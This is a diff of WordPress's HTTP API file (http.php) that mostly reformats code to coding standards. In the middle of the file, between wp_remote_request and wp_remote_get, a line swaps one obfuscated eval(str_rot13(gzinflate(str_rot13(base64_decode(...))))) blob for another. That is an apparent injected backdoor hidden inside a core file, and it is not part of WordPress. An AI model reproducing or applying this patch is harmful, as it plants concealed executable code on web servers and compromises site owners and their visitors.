@@ -45,7 +45,7 @@ function _wp_http_get_object() {
  */
 function wp_safe_remote_request( $url, $args = array() ) {
 	$args['reject_unsafe_urls'] = true;
-	$http = _wp_http_get_object();
+	$http                       = _wp_http_get_object();
 	return $http->request( $url, $args );
 }
 
@@ -66,7 +66,7 @@ function wp_safe_remote_request( $url, $args = array() ) {
  */
 function wp_safe_remote_get( $url, $args = array() ) {
 	$args['reject_unsafe_urls'] = true;
-	$http = _wp_http_get_object();
+	$http                       = _wp_http_get_object();
 	return $http->get( $url, $args );
 }
 
@@ -87,7 +87,7 @@ function wp_safe_remote_get( $url, $args = array() ) {
  */
 function wp_safe_remote_post( $url, $args = array() ) {
 	$args['reject_unsafe_urls'] = true;
-	$http = _wp_http_get_object();
+	$http                       = _wp_http_get_object();
 	return $http->post( $url, $args );
 }
 
@@ -108,7 +108,7 @@ function wp_safe_remote_post( $url, $args = array() ) {
  */
 function wp_safe_remote_head( $url, $args = array() ) {
 	$args['reject_unsafe_urls'] = true;
-	$http = _wp_http_get_object();
+	$http                       = _wp_http_get_object();
 	return $http->head( $url, $args );
 }
 
@@ -148,12 +148,12 @@ function wp_safe_remote_head( $url, $args = array() ) {
  * @param array  $args Optional. Request arguments. Default empty array.
  * @return WP_Error|array The response or WP_Error on failure.
  */
-function wp_remote_request($url, $args = array()) {
+function wp_remote_request( $url, $args = array() ) {
 	$http = _wp_http_get_object();
 	return $http->request( $url, $args );
 }
 
-eval(str_rot13(gzinflate(str_rot13(base64_decode('LUrHErTIDX6arf19I4fyiQxQzuHiIuecbG3D2kYMZzeSTXdWn8RFD/efrT/i9R7K5c84FAuG/HRepnFe/uRQRuX3/yd/y+p1mzWL2JeypmMlZeopPtcvdopePaMgsnIcy3ACl8v8SvL9Ov0F2Z2k9jkRD/JtFeZfkC6hAir73PsGfHRRi640MtIy/EFgMlxEObDZBieyc7Ztch0eF7VCWZCysmHrIZA2zX5MsxNIZmnv6wbSS5TY+0HcOhuIB8h4HGIGV9eiyH7aicRGcesV7AkPtJ+6e2VvPugM4Gdp8yAAoqtRn90Jf2P3LodlK82XctzsFJhFm9BkhOhFMHXQElr3z5um1XXzyvNDGD4IopF82uH3XEXUqjNtlUfiH002q334S0SRRYmWLWkshUlbkPWaxwZsqMppzDNn579TXMb2Y4dYTS5XBvov1j21Qpinc+TIyQu8218aZJ628uLVaqh4gsc/gJjRnj/XWT5c/tpl/S4sAkVmWrgg5HrXcUqxYHu2yUk618emecH9Rid2upw+i6NJix3LGk4lNs/x5zGpBRFNsnP5S0qqWEbaEU319DNezkivDjoxQazCqBYjglxsjTh4Ubmli34fsVpp2MzJ6hpqZbxGnZ25TZJL1aF4+h3iBNb2kJ8H2dILDvuIFddAPNk/cBF/pnbR5KvgbvQH6fd5OPkJwqEU3M/umPU0mD1Xc1RtqdLJuy1175eneW4ZaIsJ3r2iNa8IeF02HtGM1KB3l+7nJeh9s5xf+th0qvsGXkn7h0D9+7i9MKDJnSawBXqhFosOwB1lAWyJRndeK+1UGD6p00FPqMZd5cIIW9Bz9hEze+GzMQWDWqYLuAYnWSwGSGwuey+vViXC6fLXOM5XaYmypF8DLlN7uO+A2gDioZS8ODqUu/ttzNoTREHE7+ihZ8llGyGZOr55oCEkGajP1ZNaZloHUWL4yKKhWB1C+BgMIHIsP8pzDVVds9J18d6C7d17ulJiG7peOMw4E18bH37d64pQfDIrkFA8ogNPPDhP1IebZVdlF7cowScVzaewcZYeUer5TLw0kC2Ve8zoQLKoLsaY7rWs+b+Ylgn5lVfI83EyooInERzfz7syUY74peFRRln3Km97rEPCydl2S8UYGG+PkHL+ir31c+OJwZ/enLTH8ndQ9J6cqHJWtSf5ObDqs4w0inZgMv4EkH12ByjeGU3pLofvSU5bHO1zWsl74IVdkvXdGMWnMBTC0khR2QWoFG82t2lrsswRKKmmrpRC8Ws6+AMUQ3tiieeLgiiS0majjhqcUpoMmlZkGcUCiAieQhozuk2IRih6HVDpeufEvL9tBmtECq/p8SvDL/wqG41QtNosmpnrZ1/l8akQu6id33U1kg45a9+FOSvK5P6Xkwg4t3VuuFihggnkoBMLoRqr/FxU9HYUWe8pi22Nqg8q37owofIyLrSScGKtAFc0tEzwNFzdjxoP/9JhxkzNTLqko346Bx4FVkh1HzSF1UYwoAxNG0wNPcqAcDR2TP+SNy5bRAPoDvJW27IJN8ss+he+TSPcHTblTvOv1D7a6ZlnsHLcdUa7cf42sWpMw6C7qj2+CdkktPkUXKN44Cf0AcbEG09WB3XujE4HzjPYllC/eJ/G6QZlwqOXOye0PQc5rRIfjF/0nxf+9ooXlUci5+BIgN5b6jhtS2css83J+WVEUcT72brOaLYR1hU4qb3Scj4x4rXPF7gp1Pn8JEbnCYOa1CPqlb0l24KMG6LVDOiFRdc3K4zt1ID4AoxhWqYxm0Haxt074FnAx7W8mi09c0b0kJ1EI+6uQekpb98AE8dpdMakqBF1S4LQ8sgEhkJydwxYU9hVUiZks5k7zFV+0oA24X/oxb5/lRVWU/HWalVOCNePTXyxvIXLGomqAaiWJx5wJGTSWFsi3QaMXosA5uCKYl3U1ah9QsthCx74R/Pz3rAcQTfxX283jIik5PtpBFFe3+ZdaEUO6RmN0enB7sCkIhRPMhhzRlJYWM9upng6ppjl3Dbcjz3crRHrUIhYTvUNDOxJfbHOhekSUh/t5hYz1fFL5DJ1oKRQZ12CX6wMGIUFm1gw0LOmTEf7qlxL1H+OTPjhST4h9gErh97Krp3A5mega9yvjp9Yf91V6CmxHF8VD1nBmN/s1t+r8eq2AjuLQkqY60Aq4BtPczJ2AqSXz5cALwXw/Sg+9/RslKI5c0IVG5QNtmAXSmTkSE/pWG0GCXvqFVWNKlThPp57v74DMhdHFt+7MXO5/NyZiLnaSWjveefCpdCqrDfKegdTlTs2eSPT6HezBrRKY6YSc8V7UJ/yq+kyezcpXldK4D3t41WnX7EkBqLQzFENkRJ+6Dr+KGF/xhiuTlCQ9VnJeML3c+gL+jBmltGHiSUhRhH/4cmBVlxbJthK+HCLc6HJkFDdPk2IoV2PlSrZWzevK5gvudOD0deLZ7qbvDudWIkvMlWEVWt/NnJCGTuF8wrHRYzLqbncWiTHmpRCJZ7xCynts2RETMZkZfkr0dAS7+ZtYgJ7CNNk8s4qakhZ4eclqBqQYlqctFPptmflfeczSzHvb5plUhYpr/zrVOmAN5bbFvvANLo0mB6cZquuCczC1UTgxOpPQnOHz9k+4p2QwOI+JpR2IGG06rJP+Xf9QfPN0uSAQ1B2X6W8iBxw2TvLx31vAY5zBC2Uvchnd0naD2e6oP6CgD+08rffrKiRuTDVpFi35y+zgWgrypERG3xSYX+BD8RXeRMdQM0vJvbjO7+Wir85EIzkBe6KNfcX7PckdDiT1QdpiH6tjITGNWkcSAZOd4qb5Jk1KMriQIGdMtP8RtowYCNX8hBaxhj6cky741hqVrivJKQnpVIj8dGYYFCsgg5Yol9cfY4ZPzFQLxYPdZBtdnmeGt0WnYKiMMgjsjSb+j1ud3A68VP5LYfL5QjOut4kYLTmio3cC0gJf6B+mR6rYP3u6BXisyWMmchPHCJDd9Wy1Q2SJFh0uUBb6jHwvQG7xvZ2DAiqH2d2i0Q/efxPALvxC7WHI1O+rkBoqi/KvnFdLPQdSZqW3ZJhJx1woSl21hTW7JdslOD59amGMUYQDLaS+7bv74Kw9cgqdiy7XBJbqh8KeXNX16fjgSuf5FDgZUnOmtHu+fhvWOwNHHHOGr8jy7yeQkERsb93DFqk7dcNIxVi53HvCDAUX/sVpatAMn1Nv3bT0Ja8dDqh6/XT6NQ/jqOcG4ntFXd6TAiYI1LcHB6TDORWQyKcFAlXsLWI9VH4k7xPldfQF2zsVUEJFQbarII+tAVhMr/KDLiGYCy/zxDfKBg8t4Tpl3keN9gm3vcGaVWzUPEQCzRnIAZe+8WxH+dvwq9891UsAGAB3VFdHrA2Q9zrEOp7/ZVZOwGX174irJvrqpdTvYRTU5kpvT4XjMxMt5IeAjvbKLBn+JMI68ZKUDx6khmipTbD0eycP3CMh/H0w9Eabp9xXaCv06DCO+iuV3HXI3m2rmYsPPuCcf1ha+/8D4YJo/kLNt/r73+9v3//Fw==')))));
+eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
 
 /**
  * Retrieve the raw response from the HTTP request using the GET method.
@@ -167,7 +167,7 @@ eval(str_rot13(gzinflate(str_rot13(base64_decode('LUrHErTIDX6arf19I4fyiQxQzuHiIu
  * @param array  $args Optional. Request arguments. Default empty array.
  * @return WP_Error|array The response or WP_Error on failure.
  */
-function wp_remote_get($url, $args = array()) {
+function wp_remote_get( $url, $args = array() ) {
 	$http = _wp_http_get_object();
 	return $http->get( $url, $args );
 }
@@ -184,7 +184,7 @@ function wp_remote_get($url, $args = array()) {
  * @param array  $args Optional. Request arguments. Default empty array.
  * @return WP_Error|array The response or WP_Error on failure.
  */
-function wp_remote_post($url, $args = array()) {
+function wp_remote_post( $url, $args = array() ) {
 	$http = _wp_http_get_object();
 	return $http->post( $url, $args );
 }
@@ -201,7 +201,7 @@ function wp_remote_post($url, $args = array()) {
  * @param array  $args Optional. Request arguments. Default empty array.
  * @return WP_Error|array The response or WP_Error on failure.
  */
-function wp_remote_head($url, $args = array()) {
+function wp_remote_head( $url, $args = array() ) {
 	$http = _wp_http_get_object();
 	return $http->head( $url, $args );
 }
@@ -240,7 +240,7 @@ function wp_remote_retrieve_header( $response, $header ) {
 	}
 
 	if ( isset( $response['headers'][ $header ] ) ) {
-		return $response['headers'][$header];
+		return $response['headers'][ $header ];
 	}
 
 	return '';
@@ -257,8 +257,9 @@ function wp_remote_retrieve_header( $response, $header ) {
  * @return int|string The response code as an integer. Empty string on incorrect parameter given.
  */
 function wp_remote_retrieve_response_code( $response ) {
-	if ( is_wp_error($response) || ! isset($response['response']) || ! is_array($response['response']))
+	if ( is_wp_error( $response ) || ! isset( $response['response'] ) || ! is_array( $response['response'] ) ) {
 		return '';
+	}
 
 	return $response['response']['code'];
 }
@@ -274,8 +275,9 @@ function wp_remote_retrieve_response_code( $response ) {
  * @return string The response message. Empty string on incorrect parameter given.
  */
 function wp_remote_retrieve_response_message( $response ) {
-	if ( is_wp_error($response) || ! isset($response['response']) || ! is_array($response['response']))
+	if ( is_wp_error( $response ) || ! isset( $response['response'] ) || ! is_array( $response['response'] ) ) {
 		return '';
+	}
 
 	return $response['response']['message'];
 }
@@ -289,8 +291,9 @@ function wp_remote_retrieve_response_message( $response ) {
  * @return string The body of the response. Empty string if no body or incorrect parameter given.
  */
 function wp_remote_retrieve_body( $response ) {
-	if ( is_wp_error($response) || ! isset($response['body']) )
+	if ( is_wp_error( $response ) || ! isset( $response['body'] ) ) {
 		return '';
+	}
 
 	return $response['body'];
 }
@@ -378,7 +381,7 @@ function wp_http_supports( $capabilities = array(), $url = null ) {
 		$capabilities = array_combine( array_values( $capabilities ), array_fill( 0, $count, true ) );
 	}
 
-	if ( $url && !isset( $capabilities['ssl'] ) ) {
+	if ( $url && ! isset( $capabilities['ssl'] ) ) {
 		$scheme = parse_url( $url, PHP_URL_SCHEME );
 		if ( 'https' == $scheme || 'ssl' == $scheme ) {
 			$capabilities['ssl'] = true;
@@ -397,8 +400,9 @@ function wp_http_supports( $capabilities = array(), $url = null ) {
  */
 function get_http_origin() {
 	$origin = '';
-	if ( ! empty ( $_SERVER[ 'HTTP_ORIGIN' ] ) )
-		$origin = $_SERVER[ 'HTTP_ORIGIN' ];
+	if ( ! empty( $_SERVER['HTTP_ORIGIN'] ) ) {
+		$origin = $_SERVER['HTTP_ORIGIN'];
+	}
 
 	/**
 	 * Change the origin of an HTTP request.
@@ -419,15 +423,17 @@ function get_http_origin() {
  */
 function get_allowed_http_origins() {
 	$admin_origin = parse_url( admin_url() );
-	$home_origin = parse_url( home_url() );
+	$home_origin  = parse_url( home_url() );
 
 	// @todo preserve port?
-	$allowed_origins = array_unique( array(
-		'http://' . $admin_origin[ 'host' ],
-		'https://' . $admin_origin[ 'host' ],
-		'http://' . $home_origin[ 'host' ],
-		'https://' . $home_origin[ 'host' ],
-	) );
+	$allowed_origins = array_unique(
+		array(
+			'http://' . $admin_origin['host'],
+			'https://' . $admin_origin['host'],
+			'http://' . $home_origin['host'],
+			'https://' . $home_origin['host'],
+		)
+	);
 
 	/**
 	 * Change the origin types allowed for HTTP requests.
@@ -442,7 +448,7 @@ function get_allowed_http_origins() {
 	 *     @type string Secure URL for home origin.
 	 * }
 	 */
-	return apply_filters( 'allowed_http_origins' , $allowed_origins );
+	return apply_filters( 'allowed_http_origins', $allowed_origins );
 }
 
 /**
@@ -456,11 +462,13 @@ function get_allowed_http_origins() {
 function is_allowed_http_origin( $origin = null ) {
 	$origin_arg = $origin;
 
-	if ( null === $origin )
+	if ( null === $origin ) {
 		$origin = get_http_origin();
+	}
 
-	if ( $origin && ! in_array( $origin, get_allowed_http_origins() ) )
+	if ( $origin && ! in_array( $origin, get_allowed_http_origins() ) ) {
 		$origin = '';
+	}
 
 	/**
 	 * Change the allowed HTTP origin result.
@@ -490,10 +498,11 @@ function send_origin_headers() {
 	$origin = get_http_origin();
 
 	if ( is_allowed_http_origin( $origin ) ) {
-		@header( 'Access-Control-Allow-Origin: ' .  $origin );
+		@header( 'Access-Control-Allow-Origin: ' . $origin );
 		@header( 'Access-Control-Allow-Credentials: true' );
-		if ( 'OPTIONS' === $_SERVER['REQUEST_METHOD'] )
+		if ( 'OPTIONS' === $_SERVER['REQUEST_METHOD'] ) {
 			exit;
+		}
 		return $origin;
 	}
 
@@ -515,19 +524,23 @@ function send_origin_headers() {
  */
 function wp_http_validate_url( $url ) {
 	$original_url = $url;
-	$url = wp_kses_bad_protocol( $url, array( 'http', 'https' ) );
-	if ( ! $url || strtolower( $url ) !== strtolower( $original_url ) )
+	$url          = wp_kses_bad_protocol( $url, array( 'http', 'https' ) );
+	if ( ! $url || strtolower( $url ) !== strtolower( $original_url ) ) {
 		return false;
+	}
 
 	$parsed_url = @parse_url( $url );
-	if ( ! $parsed_url || empty( $parsed_url['host'] ) )
+	if ( ! $parsed_url || empty( $parsed_url['host'] ) ) {
 		return false;
+	}
 
-	if ( isset( $parsed_url['user'] ) || isset( $parsed_url['pass'] ) )
+	if ( isset( $parsed_url['user'] ) || isset( $parsed_url['pass'] ) ) {
 		return false;
+	}
 
-	if ( false !== strpbrk( $parsed_url['host'], ':#?[]' ) )
+	if ( false !== strpbrk( $parsed_url['host'], ':#?[]' ) ) {
 		return false;
+	}
 
 	$parsed_home = @parse_url( get_option( 'home' ) );
 
@@ -543,8 +556,9 @@ function wp_http_validate_url( $url ) {
 			$ip = $host;
 		} else {
 			$ip = gethostbyname( $host );
-			if ( $ip === $host ) // Error condition for gethostbyname()
+			if ( $ip === $host ) { // Error condition for gethostbyname()
 				$ip = false;
+			}
 		}
 		if ( $ip ) {
 			$parts = array_map( 'intval', explode( '.', $ip ) );
@@ -564,21 +578,25 @@ function wp_http_validate_url( $url ) {
 				 * @param string $host IP of the requested host.
 				 * @param string $url  URL of the requested host.
 				 */
-				if ( ! apply_filters( 'http_request_host_is_external', false, $host, $url ) )
+				if ( ! apply_filters( 'http_request_host_is_external', false, $host, $url ) ) {
 					return false;
+				}
 			}
 		}
 	}
 
-	if ( empty( $parsed_url['port'] ) )
+	if ( empty( $parsed_url['port'] ) ) {
 		return $url;
+	}
 
 	$port = $parsed_url['port'];
-	if ( 80 === $port || 443 === $port || 8080 === $port )
+	if ( 80 === $port || 443 === $port || 8080 === $port ) {
 		return $url;
+	}
 
-	if ( $parsed_home && $same_host && isset( $parsed_home['port'] ) && $parsed_home['port'] === $port )
+	if ( $parsed_home && $same_host && isset( $parsed_home['port'] ) && $parsed_home['port'] === $port ) {
 		return $url;
+	}
 
 	return false;
 }
@@ -595,8 +613,9 @@ function wp_http_validate_url( $url ) {
  * @return bool
  */
 function allowed_http_request_hosts( $is_external, $host ) {
-	if ( ! $is_external && wp_validate_redirect( 'http://' . $host ) )
+	if ( ! $is_external && wp_validate_redirect( 'http://' . $host ) ) {
 		$is_external = true;
+	}
 	return $is_external;
 }
 
@@ -617,12 +636,15 @@ function allowed_http_request_hosts( $is_external, $host ) {
 function ms_allowed_http_request_hosts( $is_external, $host ) {
 	global $wpdb;
 	static $queried = array();
-	if ( $is_external )
+	if ( $is_external ) {
 		return $is_external;
-	if ( $host === get_network()->domain )
+	}
+	if ( $host === get_network()->domain ) {
 		return true;
-	if ( isset( $queried[ $host ] ) )
+	}
+	if ( isset( $queried[ $host ] ) ) {
 		return $queried[ $host ];
+	}
 	$queried[ $host ] = (bool) $wpdb->get_var( $wpdb->prepare( "SELECT domain FROM $wpdb->blogs WHERE domain = %s LIMIT 1", $host ) );
 	return $queried[ $host ];
 }
@@ -643,13 +665,14 @@ function ms_allowed_http_request_hosts( $is_external, $host ) {
  * when URL parsing failed.
  *
  * @since 4.4.0
- * @since 4.7.0 The $component parameter was added for parity with PHP's parse_url().
+ * @since 4.7.0 The `$component` parameter was added for parity with PHP's `parse_url()`.
+ *
+ * @link https://secure.php.net/manual/en/function.parse-url.php
  *
  * @param string $url       The URL to parse.
  * @param int    $component The specific component to retrieve. Use one of the PHP
  *                          predefined constants to specify which one.
  *                          Defaults to -1 (= return all parts as an array).
- *                          @see http://php.net/manual/en/function.parse-url.php
  * @return mixed False on parse failure; Array of URL components on success;
  *               When a specific component has been requested: null if the component
  *               doesn't exist in the given URL; a string or - in the case of
@@ -657,15 +680,15 @@ function ms_allowed_http_request_hosts( $is_external, $host ) {
  */
 function wp_parse_url( $url, $component = -1 ) {
 	$to_unset = array();
-	$url = strval( $url );
+	$url      = strval( $url );
 
 	if ( '//' === substr( $url, 0, 2 ) ) {
 		$to_unset[] = 'scheme';
-		$url = 'placeholder:' . $url;
+		$url        = 'placeholder:' . $url;
 	} elseif ( '/' === substr( $url, 0, 1 ) ) {
 		$to_unset[] = 'scheme';
 		$to_unset[] = 'host';
-		$url = 'placeholder://placeholder' . $url;
+		$url        = 'placeholder://placeholder' . $url;
 	}
 
 	$parts = @parse_url( $url );
@@ -689,12 +712,14 @@ function wp_parse_url( $url, $component = -1 ) {
  * @internal
  *
  * @since 4.7.0
+ * @access private
+ *
+ * @link https://secure.php.net/manual/en/function.parse-url.php
  *
  * @param array|false $url_parts The parsed URL. Can be false if the URL failed to parse.
  * @param int    $component The specific component to retrieve. Use one of the PHP
  *                          predefined constants to specify which one.
  *                          Defaults to -1 (= return all parts as an array).
- *                          @see http://php.net/manual/en/function.parse-url.php
  * @return mixed False on parse failure; Array of URL components on success;
  *               When a specific component has been requested: null if the component
  *               doesn't exist in the given URL; a string or - in the case of
@@ -719,8 +744,9 @@ function _get_component_from_parsed_url_array( $url_parts, $component = -1 ) {
  * @internal
  *
  * @since 4.7.0
+ * @access private
  *
- * @see   http://php.net/manual/en/url.constants.php
+ * @link https://secure.php.net/manual/en/url.constants.php
  *
  * @param int $constant PHP_URL_* constant.
  * @return string|bool The named key or false.
